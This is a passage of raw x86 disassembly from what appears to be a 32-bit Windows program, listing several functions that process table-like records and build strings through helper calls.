  40ce4f:	je     0x40cf3d
  40ce55:	mov    DWORD PTR [ebp-0x4],edi
  40ce58:	mov    ecx,eax
  40ce5a:	xor    edi,edi
  40ce5c:	jmp    0x40ce67
  40ce5e:	mov    eax,DWORD PTR [ebp-0x24]
  40ce61:	mov    edi,DWORD PTR [ebp-0x28]
  40ce64:	mov    DWORD PTR [ebp-0x4],eax
  40ce67:	xor    eax,eax
  40ce69:	inc    eax
  40ce6a:	mov    DWORD PTR [ebp-0x8],eax
  40ce6d:	jmp    0x40ce72
  40ce6f:	mov    eax,DWORD PTR [ebp-0x8]
  40ce72:	imul   ebx,ecx,0x50
  40ce75:	add    ebx,esi
  40ce77:	je     0x40cfa1
  40ce7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce80:	test   ecx,ecx
  40ce82:	je     0x40ceca
  40ce84:	cmp    eax,0x2
  40ce87:	jne    0x40ceca
  40ce89:	mov    eax,DWORD PTR [ebx+0x8]
  40ce8c:	dec    eax
  40ce8d:	cmp    eax,0x9
  40ce90:	ja     0x40cec0
  40ce92:	movzx  eax,BYTE PTR [eax+0x40d091]
  40ce99:	jmp    DWORD PTR [eax*4+0x40d089]
  40cea0:	push   ecx
  40cea1:	mov    edx,esi
  40cea3:	call   0x40cb0d
  40cea8:	cmp    eax,0xffffffff
  40ceab:	jne    0x40cec0
  40cead:	lea    eax,[ebp-0x28]
  40ceb0:	mov    edx,esi
  40ceb2:	push   eax
  40ceb3:	push   DWORD PTR [ebp-0x4]
  40ceb6:	call   0x40cbe1
  40cebb:	cmp    eax,0xffffffff
  40cebe:	je     0x40cec7
  40cec0:	xor    eax,eax
  40cec2:	xor    ecx,ecx
  40cec4:	inc    eax
  40cec5:	jmp    0x40cecd
  40cec7:	mov    ecx,DWORD PTR [ebp-0x4]
  40ceca:	mov    eax,DWORD PTR [ebp-0x8]
  40cecd:	mov    DWORD PTR [ebp-0x38],eax
  40ced0:	mov    edx,ecx
  40ced2:	mov    eax,DWORD PTR [ebp-0x10]
  40ced5:	mov    ecx,edi
  40ced7:	mov    DWORD PTR [ebp-0x34],eax
  40ceda:	mov    eax,DWORD PTR [ebp-0xc]
  40cedd:	mov    DWORD PTR [ebp-0x30],eax
  40cee0:	lea    eax,[ebp-0x38]
  40cee3:	push   eax
  40cee4:	mov    DWORD PTR [ebp-0x2c],ebx
  40cee7:	call   0x40c55c
  40ceec:	mov    edx,DWORD PTR [ebp-0x38]
  40ceef:	test   eax,eax
  40cef1:	je     0x40d018
  40cef7:	mov    eax,DWORD PTR [ebx+0x18]
  40cefa:	test   eax,eax
  40cefc:	je     0x40cf03
  40cefe:	cmp    eax,DWORD PTR [ebx+0x1c]
  40cf01:	je     0x40cf67
  40cf03:	mov    eax,DWORD PTR [ebx+0x10]
  40cf06:	xor    edi,edi
  40cf08:	inc    DWORD PTR [ebx+0x1c]
  40cf0b:	and    eax,0x20000
  40cf10:	or     eax,edi
  40cf12:	je     0x40cf1c
  40cf14:	xor    eax,eax
  40cf16:	inc    eax
  40cf17:	mov    DWORD PTR [ebp-0x14],eax
  40cf1a:	jmp    0x40cf1f
  40cf1c:	mov    eax,DWORD PTR [ebp-0x14]
  40cf1f:	mov    ecx,DWORD PTR [ebp-0x18]
  40cf22:	add    ecx,edx
  40cf24:	mov    DWORD PTR [ebp-0x18],ecx
  40cf27:	cmp    ecx,DWORD PTR [ebp-0x1c]
  40cf2a:	jb     0x40ce07
  40cf30:	test   eax,eax
  40cf32:	jne    0x40cfdd
  40cf38:	mov    ebx,DWORD PTR [ebp-0xc]
  40cf3b:	jmp    0x40cfbb
  40cf3d:	push   DWORD PTR [ebp-0xc]
  40cf40:	mov    ecx,0x15e7
  40cf45:	push   edi
  40cf46:	call   0x4098dc
  40cf4b:	push   eax
  40cf4c:	push   0x2
  40cf4e:	call   0x40952c
  40cf53:	add    esp,0x10
  40cf56:	mov    edx,esi
  40cf58:	call   0x40ccd2
  40cf5d:	push   0x800401e4
  40cf62:	jmp    0x40cdb8
  40cf67:	test   edi,edi
  40cf69:	je     0x40cf94
  40cf6b:	push   edi
  40cf6c:	call   DWORD PTR ds:0x4120c4
  40cf72:	test   eax,eax
  40cf74:	je     0x40cf94
  40cf76:	push   DWORD PTR [ebp-0xc]
  40cf79:	mov    ecx,0x15e5
  40cf7e:	push   DWORD PTR [ebx+0x18]
  40cf81:	push   edi
  40cf82:	call   0x4098dc
  40cf87:	push   eax
  40cf88:	push   0x3
  40cf8a:	call   0x40952c
  40cf8f:	add    esp,0x14
  40cf92:	jmp    0x40cf56
  40cf94:	push   DWORD PTR [ebp-0xc]
  40cf97:	mov    ecx,0x15ea
  40cf9c:	push   DWORD PTR [ebx+0x18]
  40cf9f:	jmp    0x40cf46
  40cfa1:	call   DWORD PTR ds:0x4120cc
  40cfa7:	test   eax,eax
  40cfa9:	jne    0x40d078
  40cfaf:	push   0x42b
  40cfb4:	jmp    0x40d072
  40cfb9:	xor    edi,edi
  40cfbb:	mov    edx,edi
  40cfbd:	mov    ecx,esi
  40cfbf:	test   ecx,ecx
  40cfc1:	je     0x40cffe
  40cfc3:	mov    eax,DWORD PTR [ecx+0x10]
  40cfc6:	and    eax,0x80000
  40cfcb:	or     eax,edi
  40cfcd:	je     0x40cfd4
  40cfcf:	cmp    DWORD PTR [ecx+0x1c],edi
  40cfd2:	je     0x40cfec
  40cfd4:	inc    edx
  40cfd5:	add    ecx,0x50
  40cfd8:	cmp    edx,0x6
  40cfdb:	jb     0x40cfbf
  40cfdd:	push   edi
  40cfde:	call   DWORD PTR ds:0x412014
  40cfe4:	xor    eax,eax
  40cfe6:	inc    eax
  40cfe7:	jmp    0x40d07f
  40cfec:	cmp    DWORD PTR [ecx+0x20],0x0
  40cff0:	jne    0x40d03e
  40cff2:	mov    eax,DWORD PTR [ecx+0x10]
  40cff5:	and    eax,0x40000
  40cffa:	or     eax,edi
  40cffc:	jne    0x40d021
  40cffe:	call   DWORD PTR ds:0x4120cc
  40d004:	test   eax,eax
  40d006:	jne    0x40d013
  40d008:	push   0x42b
  40d00d:	call   DWORD PTR ds:0x412014
  40d013:	call   0x4095c0
  40d018:	mov    edx,esi
  40d01a:	call   0x40ccd2
  40d01f:	jmp    0x40d07d
  40d021:	mov    edi,DWORD PTR [ecx+0x24]
  40d024:	test   edi,edi
  40d026:	je     0x40d055
  40d028:	push   edi
  40d029:	call   DWORD PTR ds:0x4120c4
  40d02f:	test   eax,eax
  40d031:	je     0x40d055
  40d033:	push   ebx
  40d034:	mov    ecx,0x15e4
  40d039:	jmp    0x40cf45
  40d03e:	mov    edi,DWORD PTR [ecx+0x24]
  40d041:	test   edi,edi
  40d043:	jne    0x40d028
  40d045:	mov    ecx,DWORD PTR [ecx+0x20]
  40d048:	call   0x40c1d2
  40d04d:	mov    edi,eax
  40d04f:	test   edi,edi
  40d051:	jne    0x40d028
  40d053:	jmp    0x40d013
  40d055:	push   ebx
  40d056:	mov    ecx,0x15e8
  40d05b:	call   0x4098dc
  40d060:	push   eax
  40d061:	push   0x1
  40d063:	call   0x40952c
  40d068:	add    esp,0xc
  40d06b:	jmp    0x40cf56
  40d070:	push   0x57
  40d072:	call   DWORD PTR ds:0x412014
  40d078:	call   0x4095c0
  40d07d:	xor    eax,eax
  40d07f:	pop    edi
  40d080:	pop    esi
  40d081:	pop    ebx
  40d082:	mov    esp,ebp
  40d084:	pop    ebp
  40d085:	ret    0x10
  40d088:	nop
  40d089:	mov    al,ds:0xc00040ce
  40d08e:	into   
  40d08f:	inc    eax
  40d090:	add    BYTE PTR [eax],al
  40d092:	add    BYTE PTR [eax],al
  40d094:	add    DWORD PTR [ecx],eax
  40d096:	add    DWORD PTR [eax],eax
  40d098:	add    BYTE PTR [eax],al
  40d09a:	add    esp,ecx
  40d09c:	int3   
  40d09d:	int3   
  40d09e:	int3   
  40d09f:	int3   
  40d0a0:	mov    edi,edi
  40d0a2:	push   ebp
  40d0a3:	mov    ebp,esp
  40d0a5:	sub    esp,0x14
  40d0a8:	push   ebx
  40d0a9:	push   esi
  40d0aa:	push   edi
  40d0ab:	mov    esi,ecx
  40d0ad:	mov    ebx,edx
  40d0af:	push   0x16
  40d0b1:	pop    ecx
  40d0b2:	mov    DWORD PTR [ebp-0x14],esi
  40d0b5:	call   0x4092df
  40d0ba:	mov    edi,eax
  40d0bc:	test   edi,edi
  40d0be:	je     0x40d19b
  40d0c4:	cmp    DWORD PTR [ebp+0x8],0x0
  40d0c8:	je     0x40d19b
  40d0ce:	mov    ecx,edi
  40d0d0:	call   0x40aca3
  40d0d5:	shr    eax,1
  40d0d7:	mov    edx,0x401350
  40d0dc:	push   eax
  40d0dd:	mov    ecx,edi
  40d0df:	call   0x40a26c
  40d0e4:	mov    ecx,esi
  40d0e6:	call   0x40b4f1
  40d0eb:	push   0x1
  40d0ed:	lea    esi,[ebx+0x5]
  40d0f0:	mov    DWORD PTR [ebp-0x8],eax
  40d0f3:	push   esi
  40d0f4:	push   0x13
  40d0f6:	xor    edx,edx
  40d0f8:	pop    ecx
  40d0f9:	call   0x409339
  40d0fe:	push   0x1
  40d100:	push   esi
  40d101:	push   0x14
  40d103:	xor    edx,edx
  40d105:	mov    DWORD PTR [ebp-0x4],eax
  40d108:	pop    ecx
  40d109:	call   0x409339
  40d10e:	cmp    DWORD PTR [ebp-0x4],0x0
  40d112:	mov    DWORD PTR [ebp-0xc],eax
  40d115:	je     0x40d19b
  40d11b:	test   eax,eax
  40d11d:	je     0x40d19b
  40d11f:	mov    ecx,DWORD PTR [ebp+0xc]
  40d122:	call   0x409e13
  40d127:	xor    esi,esi
  40d129:	mov    DWORD PTR [ebp-0x10],eax
  40d12c:	cmp    DWORD PTR [ebp-0x8],esi
  40d12f:	jbe    0x40d19b
  40d131:	mov    ecx,DWORD PTR [ebp-0x14]
  40d134:	mov    edx,esi
  40d136:	push   ebx
  40d137:	push   DWORD PTR [ebp-0xc]
  40d13a:	call   0x40b662
  40d13f:	push   DWORD PTR [ebp-0xc]
  40d142:	mov    ecx,DWORD PTR [ebp-0x4]
  40d145:	push   DWORD PTR [ebp+0x8]
  40d148:	call   0x40aca3
  40d14d:	shr    eax,1
  40d14f:	dec    eax
  40d150:	push   eax
  40d151:	push   DWORD PTR [ebp-0x4]
  40d154:	call   0x40adea
  40d159:	add    esp,0x10
  40d15c:	mov    ecx,edi
  40d15e:	call   0x40aca3
  40d163:	mov    edx,DWORD PTR [ebp-0x4]
  40d166:	mov    ecx,edi
  40d168:	shr    eax,1
  40d16a:	push   eax
  40d16b:	call   0x40a2d1
  40d170:	mov    eax,DWORD PTR [ebp-0x8]
  40d173:	inc    esi
  40d174:	cmp    esi,eax
  40d176:	jae    0x40d19b
  40d178:	cmp    ebx,DWORD PTR [ebp-0x10]
  40d17b:	jb     0x40d19b
  40d17d:	mov    ecx,edi
  40d17f:	call   0x40aca3
  40d184:	mov    edx,DWORD PTR [ebp+0xc]
  40d187:	mov    ecx,edi
  40d189:	shr    eax,1
  40d18b:	push   eax
  40d18c:	call   0x40a2d1
  40d191:	sub    ebx,DWORD PTR [ebp-0x10]
  40d194:	mov    eax,DWORD PTR [ebp-0x8]
  40d197:	cmp    esi,eax
  40d199:	jb     0x40d131
  40d19b:	pop    edi
  40d19c:	pop    esi
  40d19d:	pop    ebx
  40d19e:	mov    esp,ebp
  40d1a0:	pop    ebp
  40d1a1:	ret    0x8
  40d1a4:	int3   
  40d1a5:	int3   
  40d1a6:	int3   
  40d1a7:	int3   
  40d1a8:	int3   
  40d1a9:	mov    edi,edi
  40d1ab:	push   ebp
  40d1ac:	mov    ebp,esp
  40d1ae:	sub    esp,0x54
  40d1b1:	mov    eax,ds:0x411004
  40d1b6:	xor    eax,ebp
  40d1b8:	mov    DWORD PTR [ebp-0x4],eax
  40d1bb:	push   ebx
  40d1bc:	push   esi
  40d1bd:	push   edi
  40d1be:	mov    DWORD PTR [ebp-0x30],edx
  40d1c1:	mov    esi,ecx
  40d1c3:	mov    DWORD PTR [ebp-0x3c],esi
  40d1c6:	mov    eax,DWORD PTR [ebp+0x8]
  40d1c9:	mov    DWORD PTR [ebp-0x34],eax
  40d1cc:	mov    eax,DWORD PTR [ebp+0xc]
  40d1cf:	mov    DWORD PTR [ebp-0x38],eax
  40d1d2:	mov    eax,ds:0x401ba0
  40d1d7:	mov    DWORD PTR [ebp-0x1c],eax
  40d1da:	mov    ax,ds:0x401ba4
  40d1e0:	mov    WORD PTR [ebp-0x18],ax
  40d1e4:	mov    eax,ds:0x401ba8
  40d1e9:	mov    DWORD PTR [ebp-0x14],eax
  40d1ec:	mov    ax,ds:0x401bac
  40d1f2:	mov    WORD PTR [ebp-0x10],ax
  40d1f6:	mov    eax,ds:0x401acc
  40d1fb:	mov    DWORD PTR [ebp-0xc],eax
  40d1fe:	mov    ax,ds:0x401ad0
  40d204:	push   0x16
  40d206:	pop    ecx
  40d207:	mov    WORD PTR [ebp-0x8],ax
  40d20b:	call   0x4092df
  40d210:	mov    ebx,eax
  40d212:	test   esi,esi
  40d214:	je     0x40d34f
  40d21a:	test   ebx,ebx
  40d21c:	je     0x40d34f
  40d222:	xor    eax,eax
  40d224:	lea    edi,[ebp-0x2c]
  40d227:	stos   DWORD PTR es:[edi],eax
  40d228:	mov    ecx,ebx
  40d22a:	stos   DWORD PTR es:[edi],eax
  40d22b:	stos   DWORD PTR es:[edi],eax
  40d22c:	stos   DWORD PTR es:[edi],eax
  40d22d:	call   0x40aca3
  40d232:	shr    eax,1
  40d234:	mov    edi,0x401350
  40d239:	push   eax
  40d23a:	mov    edx,edi
  40d23c:	mov    ecx,ebx
  40d23e:	call   0x40a26c
  40d243:	mov    ecx,DWORD PTR [esi+0x204]
  40d249:	mov    eax,ecx
  40d24b:	push   0x10
  40d24d:	and    eax,0xff0
  40d252:	pop    edx
  40d253:	sub    eax,edx
  40d255:	je     0x40d417
  40d25b:	sub    eax,edx
  40d25d:	je     0x40d3d8
  40d263:	sub    eax,edx
  40d265:	je     0x40d391
  40d26b:	sub    eax,edx
  40d26d:	je     0x40d362
  40d273:	sub    eax,0x20
  40d276:	je     0x40d2c3
  40d278:	sub    eax,0x20
  40d27b:	je     0x40d295
  40d27d:	mov    ecx,ebx
  40d27f:	call   0x40aca3
  40d284:	shr    eax,1
  40d286:	mov    edx,edi
  40d288:	push   eax
  40d289:	mov    ecx,ebx
  40d28b:	call   0x40a26c
  40d290:	jmp    0x40d31b
  40d295:	mov    edi,DWORD PTR [esi+0x28c]
  40d29b:	test   edi,edi
  40d29d:	je     0x40d34f
  40d2a3:	mov    eax,DWORD PTR [esi+0x290]
  40d2a9:	test   eax,eax
  40d2ab:	jne    0x40d2af
  40d2ad:	mov    eax,esi
  40d2af:	push   ebx
  40d2b0:	push   eax
  40d2b1:	push   DWORD PTR [ebp-0x34]
  40d2b4:	mov    ecx,edi
  40d2b6:	push   DWORD PTR [ebp-0x30]
  40d2b9:	call   DWORD PTR ds:0x41228c
  40d2bf:	call   edi
  40d2c1:	jmp    0x40d31b
  40d2c3:	mov    edx,DWORD PTR [ebp-0x30]
  40d2c6:	lea    eax,[ebp-0x50]
  40d2c9:	mov    ecx,DWORD PTR [ebp-0x34]
  40d2cc:	push   eax
  40d2cd:	call   0x40b5ee
  40d2d2:	mov    esi,eax
  40d2d4:	lea    edi,[ebp-0x2c]
  40d2d7:	push   0xfe
  40d2dc:	push   ebx
  40d2dd:	push   0x0
  40d2df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2e0:	lea    eax,[ebp-0x2c]
  40d2e3:	push   eax
  40d2e4:	push   0x80000000
  40d2e9:	push   0x400
  40d2ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2f1:	call   DWORD PTR ds:0x412018
  40d2f7:	test   eax,eax
  40d2f9:	jne    0x40d318
  40d2fb:	call   0x4095c0
  40d300:	mov    ecx,ebx
  40d302:	call   0x40aca3
  40d307:	shr    eax,1
  40d309:	push   eax
  40d30a:	call   0x4094a3
  40d30f:	mov    edx,eax
  40d311:	mov    ecx,ebx
  40d313:	call   0x40a26c
  40d318:	mov    esi,DWORD PTR [ebp-0x3c]
  40d31b:	push   ebx
  40d31c:	call   DWORD PTR ds:0x4120c4
  40d322:	test   eax,eax
  40d324:	jne    0x40d34f
  40d326:	test   DWORD PTR [esi+0x204],0x100000
  40d330:	je     0x40d34f
  40d332:	mov    ecx,ebx
  40d334:	call   0x40aca3
  40d339:	shr    eax,1
  40d33b:	mov    ecx,0x138d
  40d340:	push   eax
  40d341:	call   0x4098dc
  40d346:	mov    edx,eax
  40d348:	mov    ecx,ebx
  40d34a:	call   0x40a26c
  40d34f:	mov    ecx,DWORD PTR [ebp-0x4]
  40d352:	pop    edi
  40d353:	pop    esi
  40d354:	xor    ecx,ebp
  40d356:	pop    ebx
  40d357:	call   0x40e2c0
  40d35c:	mov    esp,ebp
  40d35e:	pop    ebp
  40d35f:	ret    0x8
  40d362:	lea    edi,[esi+0x208]
  40d368:	test   ecx,0x2000
  40d36e:	jne    0x40d373
  40d370:	lea    edi,[ebp-0xc]
  40d373:	mov    edx,DWORD PTR [ebp-0x30]
  40d376:	test   ecx,0x4000
  40d37c:	mov    ecx,DWORD PTR [ebp-0x34]
  40d37f:	jne    0x40d436
  40d385:	call   0x40b5c8
  40d38a:	push   ecx
  40d38b:	push   ecx
  40d38c:	fstp   QWORD PTR [esp]
  40d38f:	jmp    0x40d3be
  40d391:	lea    edi,[esi+0x208]
  40d397:	test   ecx,0x2000
  40d39d:	jne    0x40d3a2
  40d39f:	lea    edi,[ebp-0xc]
  40d3a2:	mov    edx,DWORD PTR [ebp-0x30]
  40d3a5:	test   ecx,0x4000
  40d3ab:	mov    ecx,DWORD PTR [ebp-0x34]
  40d3ae:	jne    0x40d436
  40d3b4:	call   0x40b5a2
  40d3b9:	push   ecx
  40d3ba:	push   ecx
  40d3bb:	fstp   QWORD PTR [esp]
  40d3be:	push   edi
  40d3bf:	mov    ecx,ebx
  40d3c1:	call   0x40aca3
  40d3c6:	shr    eax,1
  40d3c8:	dec    eax
  40d3c9:	push   eax
  40d3ca:	push   ebx
  40d3cb:	call   0x40adea
  40d3d0:	add    esp,0x14
  40d3d3:	jmp    0x40d31b
  40d3d8:	lea    edi,[esi+0x208]
  40d3de:	test   ecx,0x2000
  40d3e4:	jne    0x40d3e9
  40d3e6:	lea    edi,[ebp-0x14]
  40d3e9:	mov    edx,DWORD PTR [ebp-0x30]
  40d3ec:	test   ecx,0x4000
  40d3f2:	mov    ecx,DWORD PTR [ebp-0x34]
  40d3f5:	jne    0x40d436
  40d3f7:	call   0x40b577
  40d3fc:	push   eax
  40d3fd:	push   edi
  40d3fe:	mov    ecx,ebx
  40d400:	call   0x40aca3
  40d405:	shr    eax,1
  40d407:	dec    eax
  40d408:	push   eax
  40d409:	push   ebx
  40d40a:	call   0x40adea
  40d40f:	add    esp,0x10
  40d412:	jmp    0x40d31b
  40d417:	lea    edi,[esi+0x208]
  40d41d:	test   ecx,0x2000
  40d423:	jne    0x40d428
  40d425:	lea    edi,[ebp-0x1c]
  40d428:	mov    edx,DWORD PTR [ebp-0x30]
  40d42b:	test   ecx,0x4000
  40d431:	mov    ecx,DWORD PTR [ebp-0x34]
  40d434:	je     0x40d459
  40d436:	call   0x40b52e
  40d43b:	test   eax,eax
  40d43d:	je     0x40d34f
  40d443:	push   DWORD PTR [ebp-0x38]
  40d446:	mov    edx,DWORD PTR [esi+0x200]
  40d44c:	mov    ecx,eax
  40d44e:	push   edi
  40d44f:	call   0x40d0a0
  40d454:	jmp    0x40d31b
  40d459:	call   0x40b557
  40d45e:	test   eax,eax
  40d460:	je     0x40d34f
  40d466:	jmp    0x40d3fc
  40d468:	int3   
  40d469:	int3   
  40d46a:	int3   
  40d46b:	int3   
  40d46c:	int3   
  40d46d:	mov    edi,edi
  40d46f:	push   ebp
  40d470:	mov    ebp,esp
  40d472:	sub    esp,0x10
  40d475:	push   edi
  40d476:	mov    edi,edx
  40d478:	mov    eax,ecx
  40d47a:	mov    DWORD PTR [ebp-0x10],eax
  40d47d:	test   edi,edi
  40d47f:	je     0x40d5f6
  40d485:	push   esi
  40d486:	mov    esi,DWORD PTR [ebp+0xc]
  40d489:	test   esi,esi
  40d48b:	je     0x40d5f5
  40d491:	test   eax,eax
  40d493:	je     0x40d5f5
  40d499:	mov    ecx,edi
  40d49b:	call   0x409e13
  40d4a0:	mov    DWORD PTR [ebp-0x8],eax
  40d4a3:	cmp    eax,esi
  40d4a5:	jae    0x40d4ac
  40d4a7:	mov    eax,esi
  40d4a9:	mov    DWORD PTR [ebp-0x8],esi
  40d4ac:	push   0x1
  40d4ae:	add    eax,0x5
  40d4b1:	xor    edx,edx
  40d4b3:	push   eax
  40d4b4:	push   0x15
  40d4b6:	pop    ecx
  40d4b7:	call   0x409339
  40d4bc:	mov    DWORD PTR [ebp-0xc],eax
  40d4bf:	test   eax,eax
  40d4c1:	jne    0x40d4f5
  40d4c3:	call   DWORD PTR ds:0x4120cc
  40d4c9:	test   eax,eax
  40d4cb:	jne    0x40d4d5
  40d4cd:	push   0x8
  40d4cf:	call   DWORD PTR ds:0x412014
  40d4d5:	call   0x4095c0
  40d4da:	mov    ecx,edi
  40d4dc:	call   0x40aca3
  40d4e1:	shr    eax,1
  40d4e3:	mov    edx,0x401350
  40d4e8:	push   eax
  40d4e9:	mov    ecx,edi
  40d4eb:	call   0x40a26c
  40d4f0:	jmp    0x40d5f5
  40d4f5:	and    DWORD PTR [ebp-0x4],0x0
  40d4f9:	cmp    DWORD PTR [ebp+0x8],0x0
  40d4fd:	je     0x40d50a
  40d4ff:	mov    ecx,DWORD PTR [ebp+0x8]
  40d502:	call   0x409e13
  40d507:	mov    DWORD PTR [ebp-0x4],eax
  40d50a:	push   ebx
  40d50b:	xor    ebx,ebx
  40d50d:	cmp    DWORD PTR [ebp+0x8],0x0
  40d511:	je     0x40d5b9
  40d517:	mov    edx,DWORD PTR [ebp+0x8]
  40d51a:	mov    ecx,edi
  40d51c:	push   ebx
  40d51d:	push   0x1
  40d51f:	call   0x409d91
  40d524:	cmp    eax,0xffffffff
  40d527:	je     0x40d5b9
  40d52d:	lea    ecx,[edi+eax*2]
  40d530:	test   ecx,ecx
  40d532:	je     0x40d5b9
  40d538:	call   0x409e13
  40d53d:	mov    esi,DWORD PTR [ebp-0x4]
  40d540:	mov    ecx,edi
  40d542:	sub    esi,eax
  40d544:	call   0x409e13
  40d549:	add    eax,esi
  40d54b:	mov    esi,DWORD PTR [ebp+0xc]
  40d54e:	cmp    eax,esi
  40d550:	jae    0x40d556
  40d552:	mov    ebx,eax
  40d554:	jmp    0x40d50d
  40d556:	test   ebx,ebx
  40d558:	je     0x40d55e
  40d55a:	cmp    eax,esi
  40d55c:	jne    0x40d560
  40d55e:	mov    ebx,esi
  40d560:	mov    eax,DWORD PTR [ebp-0x8]
  40d563:	lea    ecx,[ebx+0x1]
  40d566:	cmp    eax,ecx
  40d568:	ja     0x40d56c
  40d56a:	mov    ecx,eax
  40d56c:	push   ecx
  40d56d:	mov    ecx,DWORD PTR [ebp-0xc]
  40d570:	mov    edx,edi
  40d572:	call   0x40a26c
  40d577:	mov    edx,esi
  40d579:	mov    esi,DWORD PTR [ebp-0xc]
  40d57c:	push   0x0
  40d57e:	mov    ecx,esi
  40d580:	call   0x409f47
  40d585:	mov    ecx,DWORD PTR [ebp-0x10]
  40d588:	mov    edx,esi
  40d58a:	call   0x40a377
  40d58f:	mov    ecx,esi
  40d591:	call   0x40aca3
  40d596:	shr    eax,1
  40d598:	mov    edx,edi
  40d59a:	push   eax
  40d59b:	mov    ecx,esi
  40d59d:	call   0x40a26c
  40d5a2:	mov    ecx,edi
  40d5a4:	call   0x409e13
  40d5a9:	mov    ecx,edi
  40d5ab:	cmp    eax,ebx
  40d5ad:	jle    0x40d5e0
  40d5af:	call   0x40aca3
  40d5b4:	lea    edx,[esi+ebx*2]
  40d5b7:	jmp    0x40d5ea
  40d5b9:	test   ebx,ebx
  40d5bb:	je     0x40d55e
  40d5bd:	mov    ecx,edi
  40d5bf:	call   0x409e13
  40d5c4:	sub    eax,ebx
  40d5c6:	cmp    eax,esi
  40d5c8:	ja     0x40d55e
  40d5ca:	mov    ecx,edi
  40d5cc:	call   0x409e13
  40d5d1:	cmp    eax,esi
  40d5d3:	jg     0x40d560
  40d5d5:	mov    ecx,edi
  40d5d7:	call   0x409e13
  40d5dc:	mov    ebx,eax
  40d5de:	jmp    0x40d560
  40d5e0:	call   0x40aca3
  40d5e5:	mov    edx,0x40188c
  40d5ea:	shr    eax,1
  40d5ec:	mov    ecx,edi
  40d5ee:	push   eax
  40d5ef:	call   0x40a26c
  40d5f4:	pop    ebx
  40d5f5:	pop    esi
  40d5f6:	pop    edi
  40d5f7:	mov    esp,ebp
  40d5f9:	pop    ebp
  40d5fa:	ret    0x8
  40d5fd:	int3   
  40d5fe:	int3   
  40d5ff:	int3   
  40d600:	int3   
  40d601:	int3   
  40d602:	mov    edi,edi
  40d604:	push   ebp
  40d605:	mov    ebp,esp
  40d607:	sub    esp,0x28
  40d60a:	push   ebx
  40d60b:	push   esi
  40d60c:	push   edi
  40d60d:	mov    edi,ecx
  40d60f:	test   edi,edi
  40d611:	je     0x40dabf
  40d617:	mov    esi,DWORD PTR [ebp+0x8]
  40d61a:	test   esi,esi
  40d61c:	je     0x40dabf
  40d622:	push   0x1
  40d624:	push   0x1000
  40d629:	push   0x16
  40d62b:	xor    edx,edx
  40d62d:	pop    ecx
  40d62e:	call   0x409339
  40d633:	mov    ebx,eax
  40d635:	call   0x40b124
  40d63a:	mov    DWORD PTR [ebp-0x4],eax
  40d63d:	test   eax,eax
  40d63f:	je     0x40dab1
  40d645:	test   ebx,ebx
  40d647:	je     0x40dab1
  40d64d:	test   DWORD PTR [ebp+0xc],0x1000
  40d654:	jne    0x40d763
  40d65a:	push   0x21
  40d65c:	pop    ecx
  40d65d:	xor    edx,edx
  40d65f:	mov    DWORD PTR [ebp-0x14],ecx
  40d662:	add    esi,0x204
  40d668:	mov    eax,DWORD PTR [esi]
  40d66a:	test   eax,0x1000
  40d66f:	jne    0x40d6db
  40d671:	and    DWORD PTR [ebp-0x8],0x0
  40d675:	test   eax,0x10000
  40d67a:	jne    0x40d690
  40d67c:	and    eax,0xff0
  40d681:	cmp    eax,0x20
  40d684:	je     0x40d690
  40d686:	cmp    eax,0x30
  40d689:	je     0x40d690
  40d68b:	cmp    eax,0x40
  40d68e:	jne    0x40d697
  40d690:	mov    DWORD PTR [ebp-0x8],0x1
  40d697:	cmp    edx,0x1
  40d69a:	jne    0x40d6a8
  40d69c:	mov    edx,0x40185c
  40d6a1:	mov    ecx,edi
  40d6a3:	call   0x40a377
  40d6a8:	mov    ecx,ebx
  40d6aa:	call   0x40aca3
  40d6af:	shr    eax,1
  40d6b1:	lea    edx,[esi-0x204]
  40d6b7:	push   eax
  40d6b8:	mov    ecx,ebx
  40d6ba:	call   0x40a26c
  40d6bf:	push   DWORD PTR [ebp-0x8]
  40d6c2:	mov    edx,DWORD PTR [esi-0x4]
  40d6c5:	mov    ecx,ebx
  40d6c7:	call   0x409f47
  40d6cc:	mov    edx,ebx
  40d6ce:	mov    ecx,edi
  40d6d0:	call   0x40a377
  40d6d5:	mov    ecx,DWORD PTR [ebp-0x14]
  40d6d8:	xor    edx,edx
  40d6da:	inc    edx
  40d6db:	add    esi,0x294
  40d6e1:	sub    ecx,0x1
  40d6e4:	mov    DWORD PTR [ebp-0x14],ecx
  40d6e7:	jne    0x40d668
  40d6ed:	mov    edx,0x4018f8
  40d6f2:	mov    ecx,edi
  40d6f4:	call   0x40a377
  40d6f9:	mov    esi,DWORD PTR [ebp+0x8]
  40d6fc:	xor    ecx,ecx
  40d6fe:	push   0x21
  40d700:	pop    eax
  40d701:	add    esi,0x200
  40d707:	mov    DWORD PTR [ebp-0x14],eax
  40d70a:	test   DWORD PTR [esi+0x4],0x1000
  40d711:	jne    0x40d746
  40d713:	cmp    ecx,0x1
  40d716:	jne    0x40d724
  40d718:	mov    edx,0x40185c
  40d71d:	mov    ecx,edi
  40d71f:	call   0x40a377
  40d724:	mov    ecx,DWORD PTR [esi]
  40d726:	mov    edx,0x401bb0
  40d72b:	lea    eax,[ecx+0x1]
  40d72e:	push   eax
  40d72f:	push   ecx
  40d730:	mov    ecx,ebx
  40d732:	call   0x40a0ca
  40d737:	mov    edx,ebx
  40d739:	mov    ecx,edi
  40d73b:	call   0x40a377
  40d740:	mov    eax,DWORD PTR [ebp-0x14]
  40d743:	xor    ecx,ecx
  40d745:	inc    ecx
  40d746:	add    esi,0x294
  40d74c:	sub    eax,0x1
  40d74f:	mov    DWORD PTR [ebp-0x14],eax
  40d752:	jne    0x40d70a
  40d754:	mov    edx,0x4018f8
  40d759:	mov    ecx,edi
  40d75b:	call   0x40a377
  40d760:	mov    esi,DWORD PTR [ebp+0x8]
  40d763:	mov    ecx,DWORD PTR [ebp+0x10]
  40d766:	call   0x40b4f1
  40d76b:	and    DWORD PTR [ebp-0x14],0x0
  40d76f:	mov    DWORD PTR [ebp-0x24],eax
  40d772:	test   eax,eax
  40d774:	je     0x40daa7
  40d77a:	mov    ecx,ebx
  40d77c:	call   0x40aca3
  40d781:	shr    eax,1
  40d783:	mov    edx,0x401350
  40d788:	push   eax
  40d789:	mov    ecx,ebx
  40d78b:	call   0x40a26c
  40d790:	mov    edx,DWORD PTR [ebp-0x14]
  40d793:	mov    ecx,DWORD PTR [ebp+0x10]
